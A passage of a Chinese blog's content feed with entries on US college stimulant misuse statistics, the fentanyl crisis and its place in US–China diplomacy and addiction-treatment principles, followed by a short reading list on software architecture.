<h4 id="安非他命（-Amphetamine-Misuse）"><a href="#安非他命（-Amphetamine-Misuse）" class="headerlink" title="安非他命（ Amphetamine Misuse）"></a>安非他命（ Amphetamine Misuse）</h4><p>大学生的安非他命药物滥用（ Amphetamine Misuse）情况似乎要比同龄的非大学生人群比例高。</p>
<p>大学生似乎有较高的安非他明滥用率，他们强调使用这些药物可以用来提高学习成绩。然而，并没有证据表明这些物质能长期提高学习效率。过去一年中，2.4% 的大学生和 1.6%  的非大学生使用利他林（Ritalin，中枢神经兴奋剂）。9.9% 的大学生和 6.2%  的非大学生使用阿得拉（Adderall，一种治疗注意力缺失/多动症的药物）。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/nida_mtfinfographic2016_amphetamine508.jpg" alt></p>
<h2 id="扩展阅读：《嗑药简史》"><a href="#扩展阅读：《嗑药简史》" class="headerlink" title="扩展阅读：《嗑药简史》"></a>扩展阅读：《嗑药简史》</h2><h4 id="嗑药简史（一）：药物成瘾与神经系统"><a href="#嗑药简史（一）：药物成瘾与神经系统" class="headerlink" title="嗑药简史（一）：药物成瘾与神经系统"></a><a href="https://riboseyim.github.io/2017/09/04/Addiction-Decision/" target="_blank" rel="noopener">嗑药简史（一）：药物成瘾与神经系统</a></h4><ul>
<li>什么是瘾？成瘾分类：物质成瘾、行为成瘾</li>
<li>药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草</li>
<li>行为成瘾：饮食、运动、性、暴力和战争</li>
<li>瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素）</li>
</ul>
<h4 id="嗑药简史（二）：瘾品跨境流动与外交关系"><a href="#嗑药简史（二）：瘾品跨境流动与外交关系" class="headerlink" title="嗑药简史（二）：瘾品跨境流动与外交关系"></a><a href="https://riboseyim.github.io/2017/11/06/Addiction-Decision-Fentanyl/" target="_blank" rel="noopener">嗑药简史（二）：瘾品跨境流动与外交关系</a></h4><p>扰动中美大国外交的 China Girl (芬太尼)</p>
<ul>
<li>什么是芬太尼,Fentanyl</li>
<li>大国外交的头等优先事项</li>
<li>预测：暗黑幽灵无国界</li>
</ul>
<h4 id="嗑药简史（三）：瘾品管制背后的情与法"><a href="#嗑药简史（三）：瘾品管制背后的情与法" class="headerlink" title="嗑药简史（三）：瘾品管制背后的情与法"></a><a href="https://riboseyim.github.io/2018/01/07/Addiction-Decision-Law/" target="_blank" rel="noopener">嗑药简史（三）：瘾品管制背后的情与法</a></h4><ul>
<li>严刑峻法：瘾品管制与定罪量刑</li>
<li>戈尔巴乔夫的禁酒运动</li>
</ul>
<h4 id="嗑药简史（四）：咖啡上瘾，喝还是不喝？"><a href="#嗑药简史（四）：咖啡上瘾，喝还是不喝？" class="headerlink" title="嗑药简史（四）：咖啡上瘾，喝还是不喝？"></a><a href="https://riboseyim.github.io/2018/05/14/Addiction-Decision-Coffee/" target="_blank" rel="noopener">嗑药简史（四）：咖啡上瘾，喝还是不喝？</a></h4><ul>
<li>咖啡的保健作用及临床实证研究案例</li>
<li>咖啡种类、制作工艺对健康效益的影响</li>
</ul>
<h4 id="嗑药简史（附录）：NIDA-美国青年人群药物滥用情况-2016-2017"><a href="#嗑药简史（附录）：NIDA-美国青年人群药物滥用情况-2016-2017" class="headerlink" title="嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)"></a><a href="https://riboseyim.github.io/2017/12/20/Addiction-Decision-2016-USA-Students/" target="_blank" rel="noopener">嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)</a></h4><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.drugabuse.gov/related-topics/trends-statistics/infographics/drug-alcohol-use-in-college-age-adults-in-2016" target="_blank" rel="noopener">NIDA:Drug and Alcohol Use in College-Age Adults in 2016</a></li>
<li>Schulenberg, JE, Johnston LD, O’Malley PM, Bachman JG, Meich RA, Patrick ME. Monitoring the Future national survey results on drug use, 1975-2016: Volume 2, College students and adults ages 19-55. Ann Arbor: Institute for Social Research, The University of Michigan, 2017.</li>
<li><a href="https://www.zhihu.com/question/47453418/answer/155316472" target="_blank" rel="noopener">Adderall 在期末带来的效用真的那么神奇吗？</a></li>
<li><a href="https://cn.nytimes.com/opinion/20171213/chinese-students-mental-health/" target="_blank" rel="noopener">纽约时报：那些在美国大学里痛苦挣扎的中国留学生</a></li>
<li><a href="https://cn.nytimes.com/china/20180124/pippen-pot-syracuse/" target="_blank" rel="noopener">纽约时报：幻灭的美国梦：中国留学生因何命丧大麻交易</a></li>
<li><a href="https://www.economist.com/news/international/21734365-they-are-also-lonelier-and-more-isolated-teenagers-are-better-behaved-and-less?fsrc=scn/tw/te/bl/ed/teenagersarebetterbehavedandlesshedonisticnowadaystheyouthoftoday" target="_blank" rel="noopener">Economist:Teenagers are better behaved and less hedonistic nowadays</a><br>technology has probably changed people’s behaviour. Teenagers are heavy internet users, the more so as they acquire smartphones. By their own account, 15-year-olds in OECD countries spent 146 minutes a day online on weeknights in 2015, up from 105 minutes in 2012. Chileans lead the rich world, putting in an average of 195 minutes on weekdays and 230 minutes on weekend days.</li>
</ul>
]]></content>
      <categories>
        <category>自然科学</category>
      </categories>
      <tags>
        <tag>Psychology</tag>
        <tag>Medical</tag>
        <tag>Science</tag>
        <tag>Economist</tag>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Manager</tag>
        <tag>数据可视化</tag>
      </tags>
  </entry>
  <entry>
    <title>嗑药简史：扰动大国外交的China Girl(芬太尼)</title>
    <url>/2017/11/06/Addiction-Decision-Fentanyl/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>一、什么是芬太尼（Fentanyl）：从天使到魔鬼</li>
<li>二、大国外交的头等优先事项</li>
<li>三、预测：暗黑幽灵无国界</li>
</ul>
<a id="more"></a>
<p>2017年10月26日，美国总统特朗普宣布，因芬太尼药物上瘾和滥用危机严重，美国正式进入全国公共卫生紧急状态。<br>特朗普当天在白宫说，芬太尼滥用正肆虐美国，是本国历史乃至全世界范围内最严重的药物危机，这不仅是“国家的耻辱”，也是“人类的悲剧”，联邦政府正全面遏制阿片类药物的滥用。特朗普称将在与习主席会晤时作为头等优先事项提及芬太尼问题。</p>
<p>芬太尼是何方神圣？区区一种药物也值得成为世界上两个核大国元首会谈的头等优先事项？</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Addiction-Decision-Fentanyl-8.jpeg" alt><br>注：高纯度芬太尼可以透过口腔黏膜和皮肤吸收，为防止上瘾和急性中毒，执法人员必须配置防化装备才能接触。</p>
<h2 id="一、什么是芬太尼（Fentanyl）"><a href="#一、什么是芬太尼（Fentanyl）" class="headerlink" title="一、什么是芬太尼（Fentanyl）"></a>一、什么是芬太尼（Fentanyl）</h2><p>芬太尼（Fentanyl）是一种强效止痛剂，主要用于医疗用途，在处理战伤、手术过程中缓解病患疼痛。</p>
<p>芬太尼的作用机理非常类似于吗啡 —— 读过<a href="https://riboseyim.github.io/2017/09/04/Addiction-Decision/" target="_blank" rel="noopener">嗑药简史：关于瘾品，成瘾机制及其历史</a>的同学都知道，所谓吗啡就是鸦片的核心有效成分。所以简单理解，芬太尼就是鸦片 —— 加强版的特效鸦片。</p>
<p>芬太尼最先在 1960 年由保罗·扬森制造。1960 年代以 @Sublimaze 等商业品牌作为全身麻醉剂进入医疗用途。芬太尼药物的形式包括贴片、棒棒糖、溶解片剂和可以被口腔黏膜吸收掉的舌下喷剂等。截至2013年，全球共使用了1700公斤，是医学中使用最广泛的合成鸦片类药物。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Addiction-Decision-Fentanyl-1.png" alt></p>
<h4 id="从天使到魔鬼"><a href="#从天使到魔鬼" class="headerlink" title="从天使到魔鬼"></a>从天使到魔鬼</h4><p>一个发明已经半个多世纪，并且在医疗领域广泛应用的药物为什么突然变成魔鬼呢？芬太尼的灾难在于被当作娱乐用药滥用。</p>
<blockquote>
<p>普通瘾品一经特殊方法处理，使其效力大增以后，就难免导致更严重的滥用现象，这也是瘾品发展史上一再出现的重要问题。</p>
</blockquote>
<p>芬太尼起效迅速而作用时间极短（脑中μ-鸦片受体），比吗啡效力高 50 至 100 倍，在实验室中甚至可以达到 10，000 倍。另外根据美国缉毒署的资料，检获毒品的案例中，大部分上瘾者是混合使用，例如可卡因、海洛因、大麻等传统毒品，只需要混合微量的芬太尼制品即可极大地提升药效。而且芬太尼这种处方药的戒断反应比海洛因还强，上瘾者相对来说更难把握剂量，这也是芬太尼导致大批过量死亡案例的原因。根据美国疾病控制中心的估计 2016 年有 2 万人死于芬太尼。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Addiction-Decision-Fentanyl-2.png" alt></p>
<p>目前为止，死于芬太尼的最知名的人物应该是音乐天才与艺术家普林斯·罗杰·尼尔森（Prince Rogers Nelson），艺名王子（Prince）。2016年4月15日，Prince 在他的私人飞机上突感不适，紧急降落于伊利诺伊州治疗。2016年4月21日他位于明尼苏达州的 Paisley Park 被发现死亡。后经法医调查，相信死因是服用过量的芬太尼。</p>
<h2 id="二、大国外交的头等优先事项"><a href="#二、大国外交的头等优先事项" class="headerlink" title="二、大国外交的头等优先事项"></a>二、大国外交的头等优先事项</h2><p>2017年10月17日，美国司法部正式起诉两名中国公民 —— 颜小冰(Xiaobing Yan音译) 和 张剑(Jian Zhang 音译)，指控他们策划通过邮件或国际邮递服务在美国销售大批量的芬太尼等鸦片类药物。该案成为中美两国政府激烈交锋的外交事件。</p>
<p>其实，在关于芬太尼物质列入管制的问题上，中美已经达成共识。中国官方文件将芬太尼定性为“新型精神活性物质”。2017年2月，中国正式将芬太尼——卡芬太尼、呋喃芬太尼、丙烯酰芬太尼、戊酰芬太尼等列入非药用类麻醉药品和精神药品管制品种增补目录。</p>
<p>公安部有关官员表示，中方高度重视新精神活性物质相关工作，积极推动管制立法、建立完善管制机制、大力强化执法打击、务实开展国际合作。2015年10月1日起实施的《非药用类麻醉药品和精神药品列管办法》一次性列管116种新精神活性物质。目前，中国政府列管的新精神活性物质已达134种。其中，列管芬太尼类物质共计23种，涵盖了联合国列管的全部芬太尼类物质。</p>
<p>2017年10月底，中美两国执法机构禁毒合作会议将于在北京举行。中美两国政府关于芬太尼问题的分歧主要如下：</p>
<ol>
<li>芬太尼的控制责任</li>
</ol>
<p>在2017年2月份，美国国会美中经济安全审查委员会(U.S.-China Economic and Security Review Commission)的一份报告中援引执法和毒品调查人员的话写道：“中国是美国、墨西哥和加拿大的主要芬太尼供应地”。该报告称，中国当局“对管控这种药物的生产和出口不太重视”。</p>
<blockquote>
<p>“The best way to prevent drug addiction and overdose is to prevent people from abusing drugs in the first place.  If they don’t start, they won’t have a problem.” – President Donald J. Trump</p>
</blockquote>
<p>中国公安部禁毒局的态度是：“依照现在中美双方交流交换的情报信息，证据还不足以说明大部分芬太尼物质或其他新精神活性物质来自中国”。</p>
<ol>
<li>芬太尼的管制强度</li>
</ol>
<blockquote>
<p>中国国内不存在芬太尼滥用的问题，但即便如此，中国当局仍针对美国境内的危机做出有力的回应，下令禁止的芬太尼类物质超出了美国药品机构列管的数量。2016年以来，我国根据相关国家执法协作请求，部署有关省核查向境外邮寄新精神活性物质线索，各地共抓获违法犯罪嫌疑人数十名，捣毁新精神活性物质非法生产窝点8处，缴获已列管新精神活性物质800余千克。</p>
</blockquote>
<p>总的来说，根据中国有关部门的判断，芬太尼并没有在我国境内流行。一般情况下都是在中国境内生产，通过网络联系、在线下订单，快递发货。主要销售目的地是美国、加拿大、俄罗斯、法国、瑞典、澳大利亚、意大利、芬兰、日本等发达国家。100 多年以后，饱受鸦片之苦的国家居然开始向列强倾销鸦片了，这真是一个讽刺的故事。</p>
<blockquote>
<p>山西之祸患实在鸦片。乡村民众之六成，都市居民之八成，官员兵丁之十成均有毒瘾。—— 时任山西巡抚张之洞写给友人的信</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Addiction-Decision-Fentanyl-3.png" alt></p>
<blockquote>
<p>Most were male (71.7% fentanyl and 72.2% fentanyl analogs), non-Hispanic white (81.3% fentanyl and 83.6% fentanyl analogs), and aged 25–44 years (58.4% fentanyl and 60.0% fentanyl analogs)</p>
</blockquote>
<ul>
<li><a href="https://www.whitehouse.gov/sites/whitehouse.gov/files/images/Final_Report_Draft_11-1-2017.pdf" target="_blank" rel="noopener">特朗普总统防治毒瘾和阿片类药物危机委员会的详细报告 | Report of President’s Commission on Combating Drug Addiction and the Opioid Crisis - PDF</a></li>
</ul>
<h2 id="三、预测：暗黑幽灵无国界"><a href="#三、预测：暗黑幽灵无国界" class="headerlink" title="三、预测：暗黑幽灵无国界"></a>三、预测：暗黑幽灵无国界</h2><p>芬太尼目前还没有在中国大陆流行，不代表以后也不会，或许会来得很快，或许已经到来而朝堂上下尚未感知。</p>
<p>芬太尼在北美等发达国家泛滥，也许很多国人还觉得挺好 —— 帝国主义腐朽糜烂，正是天朝崛起的大好时机嘛，甚至有人意淫这是所谓“超限战”的胜利。历史经验反复验证，瘾品的发展史，其实是一部经营扩张史。主要推动力来自科技变革与资本经营。传统瘾品（鸦片、海洛因、可卡因、大麻、酒精及烟草等等）的故事反复说明，瘾品扩张的生物基础足以跨越文化界限，刺激精神的瘾品买卖从来也不会因为国际间的禁止而萎缩。</p>
<blockquote>
<p>由于年轻人对于瘾品引起的不良反应的忍受力比较强，自然就比年纪较长的人更想寻求新鲜刺激，更容易瞻前不顾后，也更急于模仿同侪。这些心理特性都易于促成瘾品滥用。</p>
</blockquote>
<p>根据加拿大某位毒瘾治疗专家掌握的信息，芬太尼已经在高中生的聚会上流行开来，他的诊所收过一个患者，年仅12岁，已经对芬太尼上瘾。2017 年初，台湾警方破获了一起特大贩运毒品案。桃园机场一次检获 551 公斤茶叶包装的Ｋ他命（氯胺酮），纯度达97％，市价高达4亿多元新台币，可供百万人次吸食。贩毒集团瞄准的就是即将到来的垦丁“春天呐喊”音乐祭—— 音乐狂欢节，常被称为“叫春”或“春呐”，活动三天，10个舞台同时开演，超过200多组演出者轮番演出。</p>
<p>上面这些一点并不奇怪，从人的生理角度来讲，所有药物的区别只有哪个嗨和哪个更嗨的区别。中国大陆的男女老少对于任何一种使人嗨的药物都不是天生免疫的。</p>
<blockquote>
<p>反对瘾品非医疗使用的一个重要理由是源于社会成本的考虑。<br>启蒙运动和功利主义等世俗哲学思想有“为大多数人谋求最大利益”的主张，也造就了一个简单而强有力的观念：私人的获利无论多么大，都有可能使公众承担高得不可接受、道德上无可辩解的成本。</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Addiction-Decision-Fentanyl-4.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Addiction-Decision-Fentanyl-6.png" alt></p>
<p>如果您想了解更多关于芬太尼药物在美国滥用的细节，建议阅读 <a href="https://www.cdc.gov/mmwr/volumes/66/wr/mm6643e1.htm?s_cid=mm6643e1_w" target="_blank" rel="noopener">Deaths Involving Fentanyl, Fentanyl Analogs, and U-47700 — 10 States, July–December 2016 Weekly / November 3, 2017 </a>。该报告属于发病率和死亡率周报（Morbidity and Mortality Weekly Report，简称：MMWR），为一份美国疾病控制与预防中心发行的美国流行病学摘要周刊。1981年6月5日MMWR发布了历史上第一份艾滋病的医学报告。另外，还可以查询 NDEWS 提供的相关信息<a href="http://www.emcdda.europa.eu/system/files/attachments/4784/3.%20E.%20Artigiani%20-%20National%20Drug%20Early%20Warning%20System%20%28NDEWS%29%20-%20PUBLIC.pdf_en" target="_blank" rel="noopener">NDEWS: A New Approach for Multi-Level Monitoring of Opioid Trends in the U.S. | 2016 </a>，NDEWS 即美国国家药物预警系统（Dational Drug Early Warning System)，它基于遍布全国的监测中心，动态提供有关药物滥用</p>
<h4 id="Street-Names"><a href="#Street-Names" class="headerlink" title="Street Names"></a>Street Names</h4><blockquote>
<p>Street names for fentanyl or for fentanyl-laced heroin include Apache, China Girl, China White, Dance Fever, Friend, Goodfella, Jackpot, Murder 8, TNT, and Tango and Cash</p>
</blockquote>
<p>在北美街头，芬太尼及相关药物常被称为：</p>
<ul>
<li>Apache,流氓、一款武装直升机、一款开源软件</li>
<li>China Girl,</li>
<li>China White,芬太尼粉末为白色</li>
<li>Dance Fever,舞会，大家都来跳舞</li>
<li>Friend,朋友</li>
<li>Goodfella,好兄弟（黑手党成员）</li>
<li>Jackpot,大笔收入，头奖</li>
<li>Murder 8,</li>
<li>TNT,烈性摘要</li>
<li>Tango,探戈舞</li>
<li>Cash</li>
</ul>
<h4 id="美国公共卫生与药物滥用预警监测体系"><a href="#美国公共卫生与药物滥用预警监测体系" class="headerlink" title="美国公共卫生与药物滥用预警监测体系"></a>美国公共卫生与药物滥用预警监测体系</h4><ul>
<li>发病率和死亡率周报（Morbidity and Mortality Weekly Report，简称：MMWR）<br>一份美国疾病控制与预防中心发行的美国流行病学摘要周刊。1981年6月5日MMWR发布一份5位病人的病情案例，随后此份案例就成为有史以来艾滋病的首份医学报告。</li>
<li>美国疾病控制与预防中心（Centers for Disease Control and Prevention，缩写 CDC）<br>美国卫生及公共服务部所属的一个机构，总部设在乔治亚州亚特兰大。</li>
<li>美国国立卫生研究院 (National Institutes of Health，NIH)<br>位于美国马里兰州贝塞斯达（Bethesda），是美国最高水平的医学与行为学(medical and behavioral research)研究机构。初创于1887年，拥有27个研究所及研究中心和1个院长办公室(office of the director，OD)。</li>
<li>美国国家药物滥用研究所 (National Institute on Drug Abuse，NIDA 1974）</li>
<li>美国国家药物预警系统（National Drug Early Warning System，缩写 NDEWS)</li>
<li>美国禁毒署 (American Drug Enforcement Administration)</li>
</ul>
<blockquote>
<p>Addiction is a disease that affects both the brain and behavior.</p>
</blockquote>
<p><img src="https://www.economist.com/sites/default/files/imagecache/1280-width/images/print-edition/20190223_FBC955.png" alt></p>
<h2 id="Can-drug-addiction-be-treated"><a href="#Can-drug-addiction-be-treated" class="headerlink" title="Can drug addiction be treated?"></a>Can drug addiction be treated?</h2><p>Addiction treatment must help the person do the following:</p>
<ul>
<li>stop using drugs</li>
<li>stay drug-free</li>
<li>be productive in the family, at work, and in society</li>
</ul>
<h4 id="Principles-of-Effective-Treatment"><a href="#Principles-of-Effective-Treatment" class="headerlink" title="Principles of Effective Treatment"></a>Principles of Effective Treatment</h4><p>Based on scientific research since the mid-1970s, the following key principles should form the basis of any effective treatment program:</p>
<ul>
<li>Addiction is a complex but treatable disease that affects brain function and behavior.</li>
<li>No single treatment is right for everyone.</li>
<li>People need to have quick access to treatment.</li>
<li>Effective treatment addresses all of the patient’s needs, not just his or her drug use.</li>
<li>Staying in treatment long enough is critical.</li>
<li>Counseling and other behavioral therapies are the most commonly used forms of treatment.</li>
<li>Medications are often an important part of treatment, especially when combined with behavioral therapies.</li>
<li>Treatment plans must be reviewed often and modified to fit the patient’s changing needs.</li>
<li>Treatment should address other possible mental disorders.</li>
<li>Medically assisted detoxification is only the first stage of treatment.</li>
<li>Treatment doesn’t need to be voluntary to be effective.</li>
<li>Drug use during treatment must be monitored continuously.</li>
<li>Treatment programs should test patients for HIV/AIDS, hepatitis B and C, tuberculosis, and other infectious diseases as well as teach them about steps they can take to reduce their risk of these illnesses.</li>
</ul>
<h4 id="相关人物：普林斯·罗杰·尼尔森"><a href="#相关人物：普林斯·罗杰·尼尔森" class="headerlink" title="相关人物：普林斯·罗杰·尼尔森"></a>相关人物：普林斯·罗杰·尼尔森</h4><p>普林斯·罗杰·尼尔森（Prince Rogers Nelson，1958年6月7日－2016年4月21日），艺名王子（Prince），生于美国明尼苏达州。Prince 被普遍认为是一位音乐天才与艺术家。他的专辑在全球销售超过一亿张，是史上最畅销的音乐艺术家之一，为1980年代美国流行乐代表人物。</p>
<p>Prince 的音乐横跨多种风格，其中包括了放克、流行、摇滚、节奏蓝调、灵魂乐及嘻哈音乐。获得过7次格莱美奖、5次全美音乐奖、3次全英音乐奖、3次NAACP Image奖、4次MTV音乐录影带大奖。1990年获得Soul Train文化遗产奖终生成就奖，2006年获得Webby终身成就奖，2010年获得BET终生成就奖，2004年入选美国摇滚名人堂(入选名人堂的歌手需要在首张专辑发行至少25年之后)，2006年入选英国音乐名人堂。</p>
<p>2016年4月15日，Prince 在他的私人飞机上突感不适，紧急降落于伊利诺伊州治疗。2016年4月21日他位于明尼苏达州的 Paisley Park 被发现死亡。后经法医调查，相信死因是服用过量的芬太尼。</p>
<p>Prince 的意外死亡震动好莱坞，在全球有一定影响。<br>流行天后雪儿（Cher）表示：“我对 Prince 感到无比的悲伤，他曾经度过一段可怕的时光，这个世界失去太多天才了。”<br>美国古典跨界、创作歌手乔诗·葛洛班（Josh Groban）表示：“睁开眼就听说了这个糟糕透顶的消息，Prince是现代的莫扎特，连续4小时看他演奏和演唱的那一幕，始终萦绕在我脑海中。”<br>奥斯卡影后、“黑珍珠”哈莉·贝瑞表示：“今天是一个悲伤的日子，他的音乐改变了我，他将永远是我的No.1！”<br>美国创作歌手辛迪·劳帕（Cyndi Lauper）表示：“最伟大的艺术家之一Prince今天离开了我们，我将会怀念我的朋友，怀念他的建议和幽默，感谢你充满魔力的音乐。”</p>
<h2 id="扩展阅读：《嗑药简史》"><a href="#扩展阅读：《嗑药简史》" class="headerlink" title="扩展阅读：《嗑药简史》"></a>扩展阅读：《嗑药简史》</h2><h4 id="嗑药简史（一）：药物成瘾与神经系统"><a href="#嗑药简史（一）：药物成瘾与神经系统" class="headerlink" title="嗑药简史（一）：药物成瘾与神经系统"></a><a href="https://riboseyim.github.io/2017/09/04/Addiction-Decision/" target="_blank" rel="noopener">嗑药简史（一）：药物成瘾与神经系统</a></h4><ul>
<li>什么是瘾？成瘾分类：物质成瘾、行为成瘾</li>
<li>药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草</li>
<li>行为成瘾：饮食、运动、性、暴力和战争</li>
<li>瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素）</li>
</ul>
<h4 id="嗑药简史（二）：瘾品跨境流动与外交关系"><a href="#嗑药简史（二）：瘾品跨境流动与外交关系" class="headerlink" title="嗑药简史（二）：瘾品跨境流动与外交关系"></a><a href="https://riboseyim.github.io/2017/11/06/Addiction-Decision-Fentanyl/" target="_blank" rel="noopener">嗑药简史（二）：瘾品跨境流动与外交关系</a></h4><p>扰动中美大国外交的 China Girl (芬太尼)</p>
<ul>
<li>什么是芬太尼,Fentanyl</li>
<li>大国外交的头等优先事项</li>
<li>预测：暗黑幽灵无国界</li>
</ul>
<h4 id="嗑药简史（三）：瘾品管制背后的情与法"><a href="#嗑药简史（三）：瘾品管制背后的情与法" class="headerlink" title="嗑药简史（三）：瘾品管制背后的情与法"></a><a href="https://riboseyim.github.io/2018/01/07/Addiction-Decision-Law/" target="_blank" rel="noopener">嗑药简史（三）：瘾品管制背后的情与法</a></h4><ul>
<li>严刑峻法：瘾品管制与定罪量刑</li>
<li>戈尔巴乔夫的禁酒运动</li>
</ul>
<h4 id="嗑药简史（四）：咖啡上瘾，喝还是不喝？"><a href="#嗑药简史（四）：咖啡上瘾，喝还是不喝？" class="headerlink" title="嗑药简史（四）：咖啡上瘾，喝还是不喝？"></a><a href="https://riboseyim.github.io/2018/05/14/Addiction-Decision-Coffee/" target="_blank" rel="noopener">嗑药简史（四）：咖啡上瘾，喝还是不喝？</a></h4><ul>
<li>咖啡的保健作用及临床实证研究案例</li>
<li>咖啡种类、制作工艺对健康效益的影响</li>
</ul>
<h4 id="嗑药简史（附录）：NIDA-美国青年人群药物滥用情况-2016-2017"><a href="#嗑药简史（附录）：NIDA-美国青年人群药物滥用情况-2016-2017" class="headerlink" title="嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)"></a><a href="https://riboseyim.github.io/2017/12/20/Addiction-Decision-2016-USA-Students/" target="_blank" rel="noopener">嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)</a></h4><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.whitehouse.gov/sites/whitehouse.gov/files/images/Final_Report_Draft_11-1-2017.pdf" target="_blank" rel="noopener">THE PRESIDENT’S COMMISSION ON COMBATING DRUG ADDICTION AND THE OPIOID CRISIS</a></li>
<li><a href="https://www.cdc.gov/mmwr/volumes/66/wr/mm6643e1.htm?s_cid=mm6643e1_w" target="_blank" rel="noopener">Deaths Involving Fentanyl, Fentanyl Analogs, and U-47700 — 10 States, July–December 2016 Weekly / November 3, 2017 </a></li>
<li><a href="https://ndews.umd.edu/sites/ndews.umd.edu/files/pubs/ondcp-press-release-nalxone-effectiveness-july2017.pdf" target="_blank" rel="noopener">美国总统行政办公室|国家药物管制政策办公室：关于芬太尼的简报文件|July 2017</a></li>
<li><a href="https://ndews.umd.edu/sites/ndews.umd.edu/files/u1424/2016_ndews_scs_advance_report_final.pdf" target="_blank" rel="noopener">NDEWS Sentinel Community Site Advance Report 2016:Selected Findings for Heroin, Fentanyl, and Methamphetamine</a></li>
<li><a href="http://www.emcdda.europa.eu/system/files/attachments/4784/3.%20E.%20Artigiani%20-%20National%20Drug%20Early%20Warning%20System%20%28NDEWS%29%20-%20PUBLIC.pdf_en" target="_blank" rel="noopener">NDEWS: A New Approach for Multi-Level Monitoring of Opioid Trends in the U.S. | 2016 </a></li>
<li><a href="http://www.visiontimes.com/2017/11/04/fentanyl-the-killer-drug-made-in-china.html" target="_blank" rel="noopener">Fentanyl: The Killer Drug Made in China</a></li>
<li><a href="https://www.vox.com/science-and-health/2017/5/8/15454832/fentanyl-carfentanil-opioid-epidemic" target="_blank" rel="noopener">How fentanyl became America’s leading cause of overdose deaths</a></li>
<li><a href="https://www.hhs.gov/about/news/2017/10/26/hhs-acting-secretary-declares-public-health-emergency-address-national-opioid-crisis.html" target="_blank" rel="noopener">HHS Acting Secretary Declares Public Health Emergency to Address National Opioid Crisis | October 26,2017</a></li>
<li><a href="https://cn.nytimes.com/asia-pacific/20171106/china-opioid-fentanyl-trump/" target="_blank" rel="noopener">特朗普指中国系美阿片类药物泛滥罪魁 | 纽约时报</a></li>
<li><a href="http://www.chicagotribune.com/lifestyles/health/ct-teen-child-suicide-and-opioids-20170822-story,amp.html" target="_blank" rel="noopener">Connecting the dots: How the opioid epidemic affects suicide in teens and children | 芝加哥论坛报</a></li>
<li><a href="https://www.youtube.com/watch?v=UsBXtJi5t4M" target="_blank" rel="noopener">Why Do People Lose Control Over Their Cocaine Use?</a></li>
<li><a href="https://www.drugabuse.gov/publications/drugfacts/treatment-approaches-drug-addiction" target="_blank" rel="noopener">Treatment Approaches for Drug Addiction</a></li>
<li><a href="https://medium.com/s/unrulybodies/the-body-broken-by-alcohol-42e2d2ac86d" target="_blank" rel="noopener">Distress Tolerance | The body broken by alcohol</a></li>
</ul>
]]></content>
      <categories>
        <category>自然科学</category>
      </categories>
      <tags>
        <tag>Psychology</tag>
        <tag>Medical</tag>
        <tag>Science</tag>
        <tag>Economist</tag>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title>Architect：架构师</title>
    <url>/2016/04/26/Architect/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><h4 id="软件架构"><a href="#软件架构" class="headerlink" title="软件架构"></a>软件架构</h4><ul>
<li><a href="https://engineering.videoblocks.com/web-architecture-101-a3224e126947" target="_blank" rel="noopener">Web Architecture 101 | The basic architecture concepts I wish I knew when I was getting started as a web developer</a></li>
<li><a href="https://www.linux.com/blog/learn/2017/7/modern-day-front-end-development-stack" target="_blank" rel="noopener">A Modern Day Front-End Development Stack</a></li>
</ul>
<h4 id="软件工程"><a href="#软件工程" class="headerlink" title="软件工程"></a>软件工程</h4><p><strong>DDD</strong><br>Eric Evans：《Domain-Driven Design: Tackling Complexity in the Heart of Software》<br>Vaughn Vernon：《Implementing Domain-Driven Design》 （实现领域驱动设计）</p>
<ul>
<li><a href="http://zhangyi.farbox.com/post/designthinking/the-truth-of-domain-modeling" target="_blank" rel="noopener">张逸：或许是领域建模的真相</a></li>
</ul>
<p><strong>TDD</strong></p>
<ul>
<li><a href="https://dave.cheney.net/2019/05/07/prefer-table-driven-tests" target="_blank" rel="noopener">Prefer table driven tests</a></li>
<li><a href="http://zhangyi.farbox.com/post/coding/thinking-in-tdd" target="_blank" rel="noopener">张逸：推行TDD的思考</a><br>由开发人员编写测试带来的收益，最重要的一点不在于测试本身，而在于它能促进开发、测试以及需求分析人员的交流与沟通。而测试先行的方式也能让开发者跳出实现的窠臼，而从业务角度去看待问题，从消费者角度去思量接口。</li>
</ul>
<p><strong>选型方法论</strong></p>
<ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MDE0Mjc4MA==&amp;mid=200151177&amp;idx=1&amp;sn=191f2eeabf3639a38a5f4d59f96efb53&amp;scene=0%23rd" target="_blank" rel="noopener">支撑Github的开源技术 | 2014-03-28 水羽哲 InfoQ</a></li>
<li><a href="http://www.zeroequalsfalse.press/2017/03/03/soa/" target="_blank" rel="noopener">Service-Oriented Architecture.. Whatever that really means</a></li>
<li><a href="http://zhangyi.farbox.com/post/bigdata/data-storage-on-big-data-platform" target="_blank" rel="noopener">张逸：剖析大数据平台的数据存储</a><br>不是数据驱动而是业务场景驱动你对数据存储的技术决策</li>
<li><a href="https://timyang.net/tao/why-architect-need-programming/" target="_blank" rel="noopener">Tim Yang:为什么我认为架构师需要坚持写代码？</a></li>
</ul>
]]></content>
